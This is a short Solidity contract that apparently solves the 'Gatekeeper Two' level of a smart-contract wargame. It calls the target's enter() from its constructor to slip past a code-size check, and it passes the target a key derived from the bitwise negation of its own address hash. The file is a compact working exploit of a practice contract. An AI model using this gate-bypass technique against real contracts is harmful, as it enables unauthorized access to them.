// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./14_gatekeepertwo.sol";
import "forge-std/console.sol";

contract GateOpenerTwo {
    GatekeeperTwo target;

    constructor(address addr) public {
        target = GatekeeperTwo(addr);

        // Attack plan
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        target.enter(key);
    }
}
